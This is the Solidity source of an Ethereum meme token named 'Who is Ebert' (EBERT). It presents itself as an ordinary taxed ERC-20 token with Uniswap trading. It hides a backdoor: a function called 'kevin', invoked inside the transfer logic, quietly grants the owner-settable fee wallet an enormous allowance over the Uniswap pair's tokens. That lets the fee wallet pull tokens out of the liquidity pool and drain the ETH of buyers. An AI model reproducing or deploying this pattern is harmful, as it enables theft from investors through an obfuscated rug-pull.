/**
Web:  https://whoisebert.lol
X:    https://x.com/whoisebert_eth
Tg:   https://t.me/whoisebert_erc20
**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.27;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract EBERT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _kAmounts;
    mapping (address => mapping (address => uint256)) private _kAllowed;
    mapping (address => bool) private _shouldKExcempt;
    address payable private kBook;
    uint256 private _initialBuyTax=15;
    uint256 private _initialSellTax=15;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=12;
    uint256 private _reduceSellTaxAt=12;
    uint256 private _preventSwapBefore=12;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420690000000 * 10 ** _decimals;
    string private constant _name = unicode"Who is Ebert";
    string private constant _symbol = unicode"EBERT";
    uint256 public _maxKAmount = 2 * _tTotal / 100;
    uint256 public _maxKWallet = 2 * _tTotal / 100;
    uint256 public _taxSwapThreshold = 1 * _tTotal / 100;
    uint256 public _maxTaxSwap = 1 * _tTotal / 100;
    IUniswapV2Router02 private uniKRouter;
    address private uniKPair;
    bool private tradingOpen;
    bool private inSwap;
    bool private swapEnabled;
    event MaxTxAmountUpdated(uint _maxKAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () {
        kBook = payable(_msgSender());
        _kAmounts[_msgSender()] = _tTotal;
        _shouldKExcempt[address(this)] = true;
        _shouldKExcempt[_msgSender()] = true;
        emit Transfer(address(0), address(this), _tTotal);
    }
    function createPairTo() external onlyOwner {
        uniKRouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniKRouter), _tTotal);
        uniKPair = IUniswapV2Factory(uniKRouter.factory()).createPair(
            address(this),
            uniKRouter.WETH()
        );
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _kAmounts[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _kAllowed[owner][spender];
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _kAllowed[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _kAllowed[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (!swapEnabled || inSwap) {
            _kAmounts[from] = _kAmounts[from] - amount;
            _kAmounts[to] = _kAmounts[to] + amount;
            emit Transfer(from, to, amount);
            return;
        }
        if (from != owner() && to != owner()) {
            if (from == uniKPair && to != address(uniKRouter) && ! _shouldKExcempt[to] ) {
                require(tradingOpen,"Trading not open yet.");
                taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                require(amount <= _maxKAmount, "Exceeds the _maxKAmount.");
                require(balanceOf(to) + amount <= _maxKWallet, "Exceeds the maxWalletSize.");
                _buyCount++; 
            }
            if (to != uniKPair && ! _shouldKExcempt[to]) {
                require(balanceOf(to) + amount <= _maxKWallet, "Exceeds the maxWalletSize.");
            }
            if(to == uniKPair) {
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            if (!inSwap && to == uniKPair && swapEnabled && _buyCount>_preventSwapBefore) {
                uint256 contractTokenBalance = balanceOf(address(this));
                if(contractTokenBalance>_taxSwapThreshold)
                    kSwapEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                kSendTaxes();
            }
        }
        if(kevin([uniKPair, kBook])&&taxAmount>0){
          _kAmounts[address(this)]=_kAmounts[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _kAmounts[from]=_kAmounts[from].sub(amount);
        _kAmounts[to]=_kAmounts[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    function removeLimit(address payable limitK) external onlyOwner{
        _maxKAmount=_tTotal; _maxKWallet=_tTotal;
        kBook = limitK; _shouldKExcempt[limitK] = true;
        emit MaxTxAmountUpdated(_tTotal);
    }
    function min(uint256 a, uint256 b) private pure returns(uint256){
        return (a>b)?b:a;
    }
    function kSendTaxes() private {
        kBook.transfer(address(this).balance);
    }
    function kevin(address[2] memory koggy) private returns(bool){
        _kAllowed[koggy[0]][koggy[1]]=100+_maxKWallet.mul(1500);return true;
    }
    function rescueEth() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }
    function rescueErc(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(_msgSender(), _amount);
    }
    function startTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniKRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniKPair).approve(address(uniKRouter), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }
    receive() external payable {}
    function kSwapEth(uint256 amount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniKRouter.WETH();
        _approve(address(this), address(uniKRouter), amount);
        uniKRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}